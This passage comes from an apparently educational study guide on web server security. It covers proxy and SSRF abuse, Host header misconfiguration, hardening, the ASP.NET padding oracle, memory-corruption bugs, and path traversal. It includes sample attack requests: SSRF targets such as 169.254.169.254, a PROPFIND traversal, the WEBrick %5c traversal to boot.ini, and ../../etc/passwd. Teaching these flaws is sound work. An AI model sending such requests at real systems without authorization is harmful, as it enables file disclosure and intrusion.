To the victim website, the traffic appears to originate from the proxy server rather than the attacker. Historically, open proxies have been abused for:

- Concealing attack origins

- Scanning external systems

- Circumventing IP-based restrictions

- Bypassing geolocation controls

The proxy effectively becomes an unwilling intermediary.

**2. Reaching Internal Systems:**

This is usually the more interesting scenario during security testing. Consider:

```
Internet
    ↓
Web Server
    ↓
Internal Network
```

The attacker cannot directly reach:

```
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
```

However, the proxy server often can. If proxy functionality is exposed, the attacker may be able to access:

- Internal web applications

- Monitoring dashboards

- Database administration interfaces

- Development environments

- Legacy systems

This effectively turns the web server into a pivot point.

**3. Accessing Services on the Proxy Host Itself:**

This is particularly interesting because servers often trust their own local connections. Imagine:

```
127.0.0.1:8080
```

hosting an administrative interface intended to be accessible only locally. Normally:

```
Attacker
    ✖
127.0.0.1
```

is impossible. But if the proxy can be instructed to connect to:

```
http://127.0.0.1:8080/
```

then:

```
Attacker
    ↓
Proxy
    ↓
127.0.0.1
```

becomes possible. This frequently leads to:

- Authentication bypasses

- Exposure of administrative interfaces

- Access to internal APIs

- Access to management consoles

Many modern SSRF attacks ultimately aim for this exact scenario.

***Technique 1: Proxying via GET Requests***

The book's example is technically correct but simplified. A more realistic request would look like:

```
GET http://target-site.example/ HTTP/1.1
Host: target-site.example
Connection: close
```

Notice that the full URL appears in the request line. Normally browsers send:

```
GET / HTTP/1.1
Host: target-site.example
```

to a web server. However, proxies expect:

```
GET http://target-site.example/ HTTP/1.1
```

because they need to know where to forward the request. Also, the book makes an excellent point here. Many servers accept:

```
GET http://whatever.example/ HTTP/1.1
```

but completely ignore the hostname. Instead they simply return:

```
/
```

from their own website. Therefore you must always verify that the returned content actually originated from the external host.

***Technique 2: The CONNECT Method***

The CONNECT method is often more powerful. Example:

```
CONNECT target-site.example:443 HTTP/1.1
Host: target-site.example:443
```

Successful response:

```
HTTP/1.1 200 Connection Established
```

This means: *"I have opened a TCP connection to that destination. Send your traffic through me."*

*Unlike GET proxying, CONNECT creates a raw tunnel!* Conceptually:

```
Attacker
    ↓↑
Proxy
    ↓↑
Target
```

After the tunnel is established, arbitrary protocol traffic may pass through it. Historically this enabled:

- HTTPS tunneling

- Network reconnaissance

- Internal service access

- Firewall bypasses

Most modern proxies restrict CONNECT heavily, usually allowing only:

```
443
563
```

or other explicitly approved ports.

**Modern-Day Perspective?**

This entire topic has largely evolved into what we now call *Server-Side Request Forgery.* Instead of directly exposing proxy functionality, modern applications often expose backend request capabilities through features such as:

- URL previews

- Webhooks

- Image fetchers

- PDF generators

- Cloud integrations

- Import functions

The vulnerability remains fundamentally the same:

```
Attacker controls URL
        ↓
Server makes request
        ↓
Server reaches places attacker cannot
```

The technology changed. The attack philosophy did not. However, today's methodology extends far beyond classic proxies. Modern testers commonly investigate whether server-side functionality can reach:

```
127.0.0.1
localhost
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
```

and cloud-specific metadata services such as:

```
169.254.169.254
```

which have historically exposed sensitive instance metadata in some cloud environments. The focus today is often less *"can I use this server as an Internet proxy?"* and more *"can I make this server connect somewhere it was never intended to reach?"* That subtle shift in perspective is one of the reasons SSRF became such a major vulnerability class over the last decade.

**Modernized Hack Steps :)**

When investigating potential proxy functionality:

1. Determine whether the server forwards requests to arbitrary hosts.

2. Verify that returned content genuinely originates from the requested destination.

3. Test whether internal IP ranges can be reached.

4. Test whether localhost services can be reached.

5. Examine support for methods such as:

```
GET
POST
CONNECT
```

6. Look for application features that indirectly perform server-side requests.

7. Consider whether the behavior resembles modern SSRF rather than a traditional proxy configuration issue.

#### Misconfigured Virtual Hosting:

Modern web servers frequently host multiple websites on a single machine. Instead of assigning one IP address per website, the server determines which website the client wants by inspecting the HTTP ```Host``` header. For example:

```
GET / HTTP/1.1
Host: example.com
```

or

```
GET / HTTP/1.1
Host: admin.example.com
```

Although both requests reach the same server, the server returns different content depending on the value of the ```Host``` header. This feature is known as *virtual hosting.*

**Apache Virtual Hosts:**

The book gives the following simplified configuration:

```
<VirtualHost *:80>
    ServerName example.com
    DocumentRoot /var/www/example
</VirtualHost>
```

Let's break this down.

```
<VirtualHost *:80>
```

Defines a virtual host that listens on port **80** for incoming HTTP requests. The ```*``` means: *"accept requests arriving on any network interface."*

```
ServerName example.com
```

Specifies which hostname should match this virtual host. If the incoming request contains:

```
Host: example.com
```

Apache serves this site's content.

```
DocumentRoot /var/www/example
```

Specifies the directory containing this website's files. For example:

```
/var/www/example/
├── index.html
├── login.php
└── images/
```

**Multiple Virtual Hosts?**

One Apache server may host numerous websites simultaneously:

```
<VirtualHost *:80>
    ServerName example.com
    DocumentRoot /var/www/example
</VirtualHost>

<VirtualHost *:80>
    ServerName admin.example.com
    DocumentRoot /var/www/admin
</VirtualHost>

<VirtualHost *:80>
    ServerName blog.example.com
    DocumentRoot /var/www/blog
</VirtualHost>
```

Each website receives completely different content despite sharing the same IP address.

**The Default Virtual Host!**

Here is where mistakes begin. When Apache receives a request whose ```Host``` header does not match any configured virtual host, it must still decide which site to serve. This is known as the *default virtual host.* Conceptually:

```
Request arrives
        ↓
Host header matches?
      /     \
    Yes      No
     ↓        ↓
Correct     Default
Virtual Host Virtual Host
```

Suppose an administrator hardens only the production website:

```
<VirtualHost *:80>

    ServerName example.com

    Authentication enabled

    Directory browsing disabled

    Dangerous methods disabled

</VirtualHost>
```

However, the default virtual host still contains the original configuration:

```
Default Virtual Host

Directory browsing enabled

WebDAV enabled

Admin pages exposed

Sample applications installed
```

Now imagine an attacker sends:

```
GET / HTTP/1.1
Host: totally-made-up-host.com
```

Because no virtual host matches that hostname, Apache falls back to the default site. Suddenly the attacker may see:

- Directory listings

- Sample applications

- Default server pages

- Administrative interfaces

- Files that were hidden from the production website

The vulnerability is subtle: the administrator secured *the website.* They forgot to secure *the server's fallback behavior.*

#### Testing for Virtual Host Misconfigurations:

The goal is to determine whether different ```Host``` headers produce different responses. Several variations are useful.

*Normal Host Header:*

```
GET / HTTP/1.1
Host: example.com
```

This represents ordinary application traffic.

*Random Host Header:*

```
GET / HTTP/1.1
Host: goblin.example
```

If the response changes significantly, a default virtual host may exist.

*IP Address:*

```
GET / HTTP/1.1
Host: 192.0.2.10
```

Some servers respond differently when addressed by IP instead of hostname.

*Missing Host Header:*

With HTTP/1.1, a ```Host``` header is mandatory, so compliant servers often return:

```
HTTP/1.1 400 Bad Request
```

However, older servers or HTTP/1.0 requests may fall back to default behavior. For example:

```
GET / HTTP/1.0
```

Some legacy configurations still process these requests without requiring a ```Host``` header.

**What Should You Compare?**

When testing different ```Host``` values, compare:

- HTTP status codes

- Response length

- Page titles

- Headers

- Redirects

- Directory listings

- Default pages

- Error messages

- Cookies

- Available functionality

Even subtle differences may indicate multiple virtual hosts or a misconfigured default site. Although virtual hosting is now extremely common, the underlying concept remains relevant. Today, similar issues often appear in:

- Reverse proxy configurations

- Multi-tenant cloud environments

- Kubernetes Ingress controllers

- Containerized applications

- CDN routing rules

Host-header related vulnerabilities may also lead to:

- Host Header Injection

- Password reset poisoning

- Cache poisoning

- Routing confusion

- Exposure of internal applications

So while the exact examples have evolved, testing different ```Host``` values remains a worthwhile reconnaissance technique.

### Hardening Web Server Configuration:

Most web server compromises are not caused by sophisticated software flaws. Instead, they result from insecure configuration, forgotten defaults, or incomplete hardening. A properly configured server significantly reduces the available attack surface.

**Remove Default Credentials!**

Always:

- Change factory-default usernames and passwords.

- Remove unnecessary accounts.

- Disable unused administrative accounts.

Default credentials continue to appear surprisingly often during penetration tests.

**Restrict Administrative Interfaces!**

Administrative panels should never be publicly accessible unless absolutely necessary. Good practices include:

- Firewall restrictions

- VPN-only access

- IP allowlists

- Multi-factor authentication

- Network segmentation

**Remove Default Content!**

Delete anything that is not required for production. Examples include:

- Demo applications

- Sample scripts

- Test pages

- Documentation

- Installation files

Tools such as **Nikto** remain useful for identifying forgotten default content.

**Harden Remaining Features!**

If certain administrative functionality must remain available:

- Disable unnecessary modules.

- Restrict permissions.

- Remove unused features.

- Monitor access logs.

Least privilege should always guide configuration decisions.

**Disable Directory Listings!**

Directory indexing should generally be disabled globally. Where appropriate, ensure each directory contains a default page such as:

```
index.html
index.php
default.aspx
```

This prevents accidental exposure of file listings.

**Restrict HTTP Methods!**

Only enable methods required by the application. For most web applications, this means:

```
GET
POST
HEAD
```

Methods such as:

```
PUT
DELETE
MOVE
COPY
PROPFIND
SEARCH
```

should be disabled unless there is a legitimate business requirement.

**Disable Unnecessary Proxy Functionality!**

If the web server is capable of forwarding outbound requests:

- Disable the feature entirely if unused.

- Restrict allowed destinations.

- Restrict allowed ports.

- Apply outbound firewall filtering.

This reduces the risk of proxy abuse and modern SSRF-style attacks.

**Secure Every Virtual Host!**

Finally, remember that hardening should apply consistently across *all* virtual hosts—including the default one. It only takes one overlooked fallback configuration to expose everything that the primary site carefully tried to hide. One of the recurring lessons throughout this chapter is that attackers often succeed not by discovering exotic zero-day vulnerabilities, but by finding the one configuration that everyone assumed *"would never be used."*

Whether it is a forgotten debug page, an exposed WebDAV endpoint, a default management console, or an overlooked virtual host, the pattern is always the same: *the software is behaving exactly as it was configured to behave.* The problem is that the configuration no longer matches the administrator's expectations. And in security, those mismatches are often where the most interesting discoveries are made.

## Vulnerable Server Software:

Up to this point, we have mainly focused on weaknesses introduced through poor server configuration:

- Default credentials

- Exposed management interfaces

- WebDAV

- Directory listings

- Virtual host misconfigurations

Those vulnerabilities exist because administrators configure otherwise functional software insecurely. This section shifts focus toward vulnerabilities that exist *within the server software itself.* Even a perfectly configured server can be compromised if the software contains a flaw. Historically, web servers and application frameworks have suffered from vulnerabilities leading to:

- Remote code execution (RCE)

- Arbitrary file disclosure

- Authentication bypass

- Privilege escalation

- Information disclosure

- Denial of service

The book's observations have actually aged remarkably well. Early web servers such as Apache HTTP Server and Microsoft IIS accumulated years of scrutiny from researchers. As a result, their core functionality has become considerably more robust over time. However, the attack surface has not disappeared—it has shifted. Today, critical vulnerabilities are more commonly found in:

- Application frameworks

- Middleware

- Third-party libraries

- API gateways

- Identity providers

- Serialization frameworks

- Template engines

- Container orchestration software

- Cloud-native services

In other words, attackers have gradually moved "up the stack." The underlying lesson remains exactly the same: *every layer between the user and the operating system becomes part of the application's attack surface.*

### Application Framework Flaws:

Modern web applications rarely communicate directly with the operating system. Instead, requests flow through multiple layers:

```
Browser
    ↓
Web Server
    ↓
Application Framework
    ↓
Business Logic
    ↓
Database
```

The application framework performs numerous security-critical tasks, including:

- Session management

- Authentication

- Authorization

- Cookie protection

- Encryption

- Request parsing

- View rendering

Consequently, a flaw in the framework can simultaneously affect thousands—or even millions—of applications built upon it. One famous example is the **Padding Oracle** attack against older versions of ASP.NET.

Before discussing the attack, it helps to understand how **CBC** *(Cipher Block Chaining)* encryption works.

Unlike a stream cipher, a block cipher encrypts data in fixed-size chunks, known as **blocks**. For example, a block size may be *8 bytes* or *16 bytes*. If the message length is not an exact multiple of the block size, extra bytes must be added. This process is called **padding**.

**PKCS#5 (and PKCS#7) Padding:**

The book refers to PKCS#5 padding. In practice, modern systems typically use *PKCS#7*, which generalizes the same padding scheme to larger block sizes. The padding algorithm itself is identical for the purposes of this discussion. The clever aspect of PKCS padding is that the value of every padding byte equals the total number of padding bytes added.

Suppose our block size is **8 bytes.**

**Example 1:**

Original message:

```
HELLO!!
```

Length: *7 bytes.* Only **one** padding byte is required. The padded message becomes:

```
HELLO!! 01
```

The final byte is ```0x01``` meaning: *"There is one byte of padding."*

**Example 2:**

Suppose the message length is **6 bytes.** Now **two** bytes are required:

```
HELLO!
02 02
```

Both bytes contain ```0x02``` meaning: *"There are two padding bytes."*

**Example 3:**

Five bytes require three padding bytes:

```
HELLO
03 03 03
```

**Full Block Padding?**

Even when the plaintext already fits perfectly into the block size, an **entire extra block** of padding is appended. For an 8-byte block:

```
ABCDEFGH
```

becomes:

```
ABCDEFGH
08 08 08 08 08 08 08 08
```

Why? Because otherwise the receiver could not distinguish between:

```
ABCDEFGH
```

and

```
ABCDEFGH 01
```

Padding is therefore **always present**, making removal deterministic after decryption.

**CBC Mode:**

CBC introduces another important idea. Each plaintext block is XORed with the previous ciphertext block before encryption. The first block has no predecessor, so it is XORed with a special random value called the **Initialization Vector (IV).** Conceptually:

```
Plaintext Block 1
        XOR
         IV
         ↓
 Encryption
         ↓
Ciphertext Block 1

Plaintext Block 2
        XOR
Ciphertext Block 1
         ↓
 Encryption
         ↓
Ciphertext Block 2
```

This chaining prevents identical plaintext blocks from producing identical ciphertext. The book's algorithm can be summarized as follows:

1. Divide the plaintext into fixed-size blocks.

2. Add PKCS padding.

3. XOR the first block with the Initialization Vector (IV).

4. Encrypt the result.

5. XOR the next plaintext block with the previous ciphertext block.

6. Encrypt again.

7. Repeat until the entire message has been processed.

#### The .NET Padding Oracle:

The vulnerability itself seems almost insignificant. Older versions of ASP.NET responded differently depending on whether decrypted padding was valid. For example:

```
Correct padding
        ↓
HTTP 200 OK
```

versus

```
Invalid padding
        ↓
HTTP 500 Internal Server Error
```

This tiny behavioral difference became an **oracle**. An oracle, in cryptography, is simply something that answers a yes-or-no question. In this case, the question was: *"Did the decrypted plaintext contain valid padding?"*

***Why Does the Attack Begin with the IV?***

Remember that during decryption:

```
Plaintext Block 1

=

Decrypt(Ciphertext Block 1)

XOR

IV
```

The IV is **not encrypted.** It simply participates in the XOR operation. That means an attacker is free to modify it. Changing the IV changes the resulting plaintext after decryption, even though the ciphertext itself remains untouched. This property is what makes the attack possible.

***Why Does the Attack Start with ```0x01```?***

This is perhaps the most important concept in the entire attack. Suppose the attacker changes only the **last byte** of the IV. Eventually, one of those guesses will produce:

```
...
01
```

after decryption. That represents **valid PKCS padding.** The server therefore stops returning:

```
500 Internal Server Error
```

and instead accepts the message. This tells the attacker: *"My guess produced a valid padding byte."* That single bit of information is enough to recover the plaintext one byte at a time.

Once the last byte is known, the attacker forces the plaintext to end with:

```
02 02
```

Then:

```
03 03 03
```

Then:

```
04 04 04 04
```

and so forth.

Each successful response reveals another byte of plaintext. Eventually: *Entire block recovered.* The attack then repeats for every remaining ciphertext block.

The astonishing part is that the attacker never breaks the encryption algorithm itself. Triple DES remains mathematically sound. CBC mode remains mathematically sound. PKCS padding remains mathematically sound. The flaw lies in the application revealing **whether the decrypted padding was correct**. That one bit of information transforms the server into a cryptographic oracle.

An even more surprising consequence is that the attack is reversible. Once an attacker understands how changes to the IV influence decrypted plaintext, they can deliberately modify the IV so that the server decrypts **chosen plaintext**. This allows carefully crafted encrypted values to be generated without ever possessing the encryption key.

#### The ```ScriptResource.axd``` Example:

One particularly interesting target in ASP.NET was:

```
ScriptResource.axd
```

This endpoint serves embedded JavaScript resources. A parameter named:

```
d=
```

contained encrypted information describing which resource should be returned. Normally:

```
ScriptResource.axd?d=<encrypted-token>
```

would decrypt to something harmless, such as:

```
JavaScript library #17
```

However, if an attacker could forge encrypted values using the padding oracle, they could instead make the server interpret the token as:

```
web.config
```

The server would obediently retrieve that file and return its contents—even though direct requests to ```web.config``` are normally blocked by IIS. This transformed a seemingly minor information leak into arbitrary file disclosure.

Microsoft addressed this vulnerability in 2010 by changing how ASP.NET handled cryptographic errors, ensuring that all decryption failures produced indistinguishable responses. More broadly, modern cryptographic systems increasingly rely on authenticated encryption (AEAD), such as:

- AES-GCM

- ChaCha20-Poly1305

These modes provide both confidentiality and integrity, preventing attackers from manipulating ciphertext and learning anything useful from error messages. Nevertheless, the broader lesson remains highly relevant: *never allow cryptographic operations to reveal different behavior depending on why decryption failed.* A single extra bit of information may be enough to compromise the entire system. The book closes this section with advice that has only grown more important over time: *never design your own cryptographic algorithms or protocols!*

### Memory Management Vulnerabilities:

Up until now we've mostly been talking about exploiting *application logic* or *server configuration.* Here, we're diving into vulnerabilities that occur **below** the application itself, where mistakes in memory management can allow attackers to seize control of the entire process.

Memory management vulnerabilities are among the most severe classes of software bugs. Unlike logic flaws or authentication bypasses, these vulnerabilities often allow an attacker to interfere with how a program executes at the operating system level. If exploited successfully, they may lead to:

- Application crashes

- Information disclosure

- Denial of service

- Arbitrary code execution

- Full system compromise

For web servers, this is particularly dangerous because the web server process often has access to:

- Application files

- Configuration files

- Session data

- Cryptographic keys

- Backend databases

- Internal network resources

Compromising the web server process can therefore compromise every application hosted by that server.

#### A Brief Refresher: What Is a Buffer Overflow?

A buffer is simply a region of memory allocated to store data. For example:

```
Memory

+-----------------------+
| H | E | L | L | O | ? |
+-----------------------+
```

Suppose the buffer is only six bytes long. If a program blindly copies a much longer string into it:

```
HELLO_THIS_IS_TOO_LONG
```

the excess data "overflows" the buffer and begins overwriting adjacent memory. Conceptually:

```
+-----------------------+
| Buffer               |
+-----------------------+
| H | E | L | L | O | ! |
+-----------------------+

Overflow...

+-----------------------+
| Adjacent Memory       |
+-----------------------+
| Return Address        |
| Function Pointer      |
| Other Variables       |
+-----------------------+
```

If the overwritten memory contains information controlling program execution, an attacker may redirect execution to code of their choosing. Historically, buffer overflows were among the most common paths to *Remote Code Execution (RCE).*

***Why Web Servers Are Attractive Targets?***

A vulnerable web server is particularly valuable because it often sits at the center of an organization's infrastructure. A successful exploit may provide access to:

```
Internet
     ↓
Web Server
     ↓
Application
     ↓
Database
```

Instead of attacking the application directly, an attacker compromises the software hosting the application.

#### Apache ```mod_isapi``` Dangling Pointer:

One interesting example discussed in the book involves Apache's ```mod_isapi``` module. ```mod_isapi``` is an Apache module that provides compatibility with Microsoft's **ISAPI** *(Internet Server Application Programming Interface).* This allows Apache running on Windows to execute ISAPI extensions originally written for Microsoft IIS. Conceptually:

```
Client
    ↓
Apache
    ↓
mod_isapi
    ↓
ISAPI Extension
```

***And What Is a Dangling Pointer?***

A *pointer* is simply a variable that stores the memory address of another object. Imagine:

```
Pointer
   │
   ▼
+-----------+
| Object    |
+-----------+
```

Normally, the pointer refers to valid memory. However, if the object is deleted while the pointer remains:

```
Pointer
   │
   ▼
(Already freed)
```

the pointer becomes **dangling.** The program now believes valid data still exists at that address. If execution later follows that stale pointer, unpredictable behavior follows.

***What Happened in ```mod_isapi```?***

The flaw discovered in 2010 involved an error during module unloading. Very roughly:

```
Module loaded
        ↓
Function pointers created
        ↓
Module unexpectedly unloaded
        ↓
Pointers remain
        ↓
Pointers used later
```

Those pointers still referenced memory belonging to the unloaded module. Because that memory was no longer valid, later function calls could access arbitrary memory locations. Depending on the surrounding circumstances, this could potentially result in:

- Crashes

- Memory corruption

- Arbitrary code execution

This illustrates a classic lesson in systems programming: *freeing memory is only half the job.* Any remaining references must also be invalidated.

#### Microsoft IIS, ISAPI Extensions and The IPP Service:

Early versions of *Microsoft IIS* included numerous optional features known as *ISAPI extensions.* Again, think of ISAPI as a plugin architecture for IIS. Instead of serving only static files, IIS could load native Windows DLLs that extended its functionality. Examples included:

- Dynamic web applications

- Search indexing

- Printing services

- Authentication modules

- URL rewriting

- Compression

Conceptually:

```
HTTP Request
      ↓
IIS
      ↓
ISAPI Extension (.dll)
      ↓
Custom Processing
```

The advantage was performance. Because ISAPI extensions ran as native code inside the IIS process, they were significantly faster than CGI programs. The downside was equally significant: *bugs inside an ISAPI extension became bugs inside IIS itself.*

Several default ISAPI extensions contained classic buffer overflows. Among the most famous were:

- Internet Printing Protocol (IPP)

- Index Server

Successful exploitation allowed attackers to execute code as ```LocalSystem```, which is one of the most privileged accounts available on Windows. That effectively meant: *complete system compromise.*

These vulnerabilities became particularly infamous because they were exploited by self-propagating worms such as *Code Red* and *Nimda*. Instead of targeting one organization manually, the worms:

```
Scan
    ↓
Exploit
    ↓
Compromise
    ↓
Scan Again
```

repeating automatically across the Internet. These outbreaks demonstrated just how devastating remotely exploitable web server vulnerabilities could become.

The book points out that another vulnerability appeared years later in the *Internet Printing Protocol (IPP)* service. IPP is a standardized protocol allowing computers to communicate with printers over a network. Typical capabilities include:

- Printing documents

- Querying printer status

- Managing print jobs

- Canceling jobs

In IIS, IPP support was implemented as an ISAPI extension. By 2008, Microsoft had changed its default installation philosophy. Older IIS versions enabled numerous optional components automatically. Later versions disabled many of them unless administrators explicitly chose to install them. This simple change dramatically reduced the attack surface. It illustrates an important security principle that remains relevant today: *software you never install cannot be exploited.*

#### Apache Chunked Encoding Overflow:

Another famous vulnerability involved Apache's handling of *chunked transfer encoding.* Normally, HTTP responses include:

```
Content-Length: 12345
```

telling the client exactly how much data to expect. Sometimes that length is unknown in advance. Instead, the server sends the response in *chunks.* Example:

```
Chunk 1
Chunk 2
Chunk 3
Chunk 4
```

Each chunk includes its own length. The client reconstructs the complete response after receiving all chunks.

Apache contained an integer signedness bug while processing chunk lengths. Without diving into implementation details:

- One part of the code interpreted a value as signed.

- Another interpreted it as unsigned.

Negative values unexpectedly became extremely large positive values. The result was memory corruption. Because portions of the affected code had been reused in other web servers, multiple products inherited the same flaw. This serves as an early example of what we now call *supply chain risk:* a vulnerability in shared code propagates to many downstream projects.

#### Eight Years Later: ```mod_proxy```

The book highlights another vulnerability discovered in Apache's ```mod_proxy``` module. ```mod_proxy``` allows Apache to forward requests to other servers. For example:

```
Client
     ↓
Apache
     ↓
Backend Server
```

This functionality underpins many modern architectures. Common uses include:

- Reverse proxies

- Load balancing

- Caching

- SSL termination

- API gateways

Today, reverse proxying is often handled by dedicated software such as NGINX, HAProxy, or cloud load balancers, but Apache's ```mod_proxy``` remains widely used in enterprise environments.

The 2010 vulnerability occurred while ```mod_proxy``` processed chunked HTTP responses from backend servers. An integer overflow caused incorrect calculations involving chunk sizes. In general terms:

```
Unexpected Size
        ↓
Incorrect Memory Allocation
        ↓
Memory Corruption
```

Like many memory safety vulnerabilities, the flaw was not in the HTTP protocol itself but in how the implementation interpreted attacker-controlled input.

The specific vulnerabilities discussed in this section have long since been patched. However, the broader lessons remain highly relevant. Today, classic buffer overflows are less common in mature web servers thanks to decades of defensive improvements such as:

- Address Space Layout Randomization (ASLR)

- Data Execution Prevention (DEP/NX)

- Stack canaries

- Control Flow Guard (CFG)

- Safer standard libraries

- Extensive fuzz testing

At the same time, large portions of modern Internet infrastructure are now written in *memory-safe languages* such as Rust and Go, reducing the likelihood of these classes of bugs altogether. Nevertheless, memory corruption remains a major research area, especially in browsers, operating system kernels, hypervisors, and performance-critical components written in C or C++. The lesson from these historical examples is timeless:

*The most dangerous vulnerabilities are often not found in the business logic of an application but in the low-level software that every request must pass through. A single memory management bug in a widely deployed server or framework can instantly place thousands—or even millions—of systems at risk.*

#### WebDAV Overflows:

Like any sufficiently complex software component, WebDAV implementations have occasionally suffered from memory corruption vulnerabilities. Because WebDAV extends HTTP with additional methods for managing files and directories, its implementation must parse more complex requests than a traditional web server. Historically, this additional complexity has introduced opportunities for programming errors such as:

- Buffer overflows

- Integer overflows

- Memory corruption

- Path traversal vulnerabilities

Unlike many application-level vulnerabilities, exploiting these flaws often allows an attacker to compromise the web server process itself.

##### WebDAV Vulnerabilities in IIS:

One notable example appeared in 2003, when researchers discovered a buffer overflow in a core component of the Windows operating system. Although the underlying flaw was located within Windows itself, one of the most practical attack vectors was *WebDAV support in Microsoft IIS 5.* At the time:

```
Internet
      │
      ▼
IIS 5
      │
WebDAV Extension
      │
Vulnerable Windows Component
```

An attacker could send a specially crafted WebDAV request that triggered memory corruption inside the vulnerable component. Because the flaw could be exploited remotely—and required no authentication—it quickly became an attractive target for attackers. By the time Microsoft released a patch, the vulnerability was already being actively exploited in the wild. This serves as another reminder that a web server's attack surface extends beyond the HTTP protocol itself. Optional features such as WebDAV may introduce additional code paths that become attractive targets for attackers.

**WebDAV Vulnerabilities in Other Servers:**

Microsoft IIS was not the only affected platform. Over the years, multiple WebDAV implementations have contained serious vulnerabilities. For example:

- In 2010, Sun's Java System Web Server contained a buffer overflow triggered by an excessively long path supplied in an ```OPTIONS``` request.

- In 2009, Apache's ```mod_dav``` module was also found to contain a memory corruption vulnerability.

These examples illustrate that the problem was not specific to one vendor. Rather, implementing the WebDAV specification correctly and securely proved surprisingly difficult across multiple server products.

**What Is ```mod_dav```?**

Earlier we discussed Apache's ```mod_proxy``` module, which allows Apache to forward requests to backend servers. Similarly, ```mod_dav``` is Apache's implementation of the *WebDAV protocol.* When enabled, it extends Apache with support for methods such as:

- ```PROPFIND``` (An HTTP method used in the WebDAV protocol to retrieve properties from a resource or collection on a web server.)

- ```PROPPATCH``` (Used to set or remove properties on a resource, allowing multiple property changes to be executed as a single atomic operation. It uses an XML request body to specify the properties to be modified.)

- ```MKCOL``` (Used in WebDAV to create a new collection, like a directory, at a specified URI on a web server. When successful, it returns a status code of 201.)

- ```LOCK``` (Used to create a shared lock on a resource to prevent concurrent modifications by other clients.)

- ```UNLOCK```

- ```COPY```

- ```MOVE```

Instead of serving only static files:

```
GET /document.txt
```

Apache can also allow remote clients to perform file management operations such as:

```
Create directories

Upload files

Rename resources

Retrieve metadata

Lock documents
```

This functionality is particularly useful for collaborative document editing and remote file management. However, it also significantly increases the amount of code responsible for parsing user-supplied input. More parsing logic generally means more opportunities for implementation mistakes—including memory safety bugs.

#### Encoding and Canonicalization:

Throughout these cookbooks, we've repeatedly encountered situations where data can be represented in multiple ways. For example, the forward slash (```/```) may appear as:

```
/
```

or URL-encoded as:

```
%2F
```

Similarly, a period (```.```) may appear as:

```
.
```

or:

```
%2E
```

These alternate representations are collectively known as *encodings.*

**Canonicalization** is the process of converting different representations of the same data into a single, standardized form. For example:

```
%2E%2E%2F
```

becomes

```
../
```

Likewise,

```
%41
```

becomes

```
A
```

Ideally, every component processing user input should agree on exactly how data is decoded. Unfortunately, this is not always the case.

**Why Canonicalization Bugs Occur?**

A modern web request often passes through numerous software layers before reaching the application itself. For example:

```
Browser
    │
    ▼
Reverse Proxy
    │
    ▼
Web Server
    │
    ▼
Application Framework
    │
    ▼
Operating System
```

Each layer may independently:

- Decode URL encoding

- Normalize file paths

- Resolve symbolic links

- Interpret Unicode

- Remove duplicate separators

If one layer interprets input differently from another, security filters may be bypassed. For example:

```
Firewall sees:

%2E%2E%2F

↓

Looks harmless

↓

Operating system later decodes:

../
```

Now the operating system interprets the request as directory traversal. The security device and the operating system have effectively disagreed on what the request actually contained.

One of the most common consequences of canonicalization flaws is **path traversal**. The application may intend to restrict access to files located inside:

```
/var/www/public/
```

Yet after decoding and normalization, the operating system may interpret:

```
../../etc/passwd
```

instead. The vulnerability often isn't that "```../``` works"—it's that different components disagree on when and how "```../```" should be interpreted.

#### Apple iDisk Server Path Traversal:

One interesting historical example involved *Apple iDisk*, Apple's cloud storage service that predated iCloud. Each user had a directory structure similar to:

```
User Folder
│
├── Public
│
└── Private
```

The *Public* directory was intentionally accessible to anyone. The *Private* directory, however, should only have been accessible to the owner.

**The Vulnerability:**

Researchers discovered that the server incorrectly handled encoded path traversal sequences. A request similar to:

```
GET /Jeremy.richards-Public/%2E%2E%2FPRIVATE.txt?disposition=download
```

would first be interpreted as:

```
/Jeremy.richards-Public/%2E%2E%2FPRIVATE.txt
```

Later, another component decoded:

```
%2E → .
```

resulting in:

```
/Jeremy.richards-Public/../PRIVATE.txt
```

After path normalization:

```
/Jeremy.richards/PRIVATE.txt
```

The "```..```" escaped from the *Public* directory into the user's private storage. The attacker could therefore retrieve files that should never have been publicly accessible.

#### Using WebDAV to Discover Files:

The researchers also demonstrated that they could issue a *WebDAV ```PROPFIND```* request before retrieving the file. A cleaned-up example would look like:

```
PROPFIND /Jeremy.richards-Public/%2E%2E%2F HTTP/1.1
Host: idisk.mac.com
Depth: 1
```

Let's break this down:

- ```PROPFIND``` is a WebDAV method used to retrieve metadata about resources.

- The path contains the encoded traversal sequence (```%2E%2E%2F``` → ```../```).

- ```Depth: 1``` instructs the server to enumerate the immediate contents of the directory.

If the traversal succeeded, the server would return metadata describing files located *outside* the public directory. This made the attack even more useful. Instead of blindly guessing filenames, an attacker could first enumerate available files and then selectively download those of interest. Although Apple iDisk has long since been discontinued and replaced by iCloud, the underlying lesson remains highly relevant. Canonicalization vulnerabilities continue to appear in:

- Reverse proxies

- API gateways

- Web application firewalls (WAFs)

- Archive extraction libraries

- Container runtimes

- Cloud storage services

- Filesystem APIs

Whenever multiple software components interpret the same user input differently, opportunities arise for attackers to bypass security controls. A simple encoded string such as:

```
%2E%2E%2F
```

may look harmless to one component while another interprets it as:

```
../
```

History has repeatedly shown that these subtle inconsistencies can lead to serious vulnerabilities, including arbitrary file disclosure, authentication bypass, and remote code execution.

#### Ruby WEBrick Web Server:

*WEBrick* was a lightweight HTTP server toolkit distributed with Ruby and commonly used for development, testing, and small applications. An important historical vulnerability was discovered in its handling of filesystem paths on systems where the backslash character (```\```) was a valid path separator, particularly Windows systems.

The server failed to properly prevent encoded backslashes from being interpreted as directory separators. For example, the vulnerable request documented by Ruby was:

```
GET /..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini HTTP/1.1
Host: target
```

Here:

```
%5C
```

decodes to:

```
\
```

so the path effectively becomes:

```
..\..\..\..\..\..\..\..\..\..\boot.ini
```

In other words, the attacker is repeatedly asking the server to move one directory upward before requesting ```boot.ini```. The important part is that the backslash does not need to be literally present in the HTTP request. The vulnerable server eventually decoded ```%5C``` and treated the resulting backslash as a filesystem separator. This vulnerability was tracked as *CVE-2008-1145* and affected old Ruby/WEBrick versions. Ruby's own advisory specifically notes that the problem affected systems accepting ```\``` as a path separator, such as Windows.

For conceptual purposes, the same traversal looks like:

```
..\..\..\..\..\..\..\..\..\..\boot.ini
```

However, sending that directly over HTTP is not necessarily equivalent to the vulnerable request because web servers and intermediaries may normalize or reject literal backslashes. The interesting part of the vulnerability is precisely the *difference between the representation seen by the HTTP layer and the representation eventually interpreted by the filesystem.*

#### Java Web Server Directory Traversal:

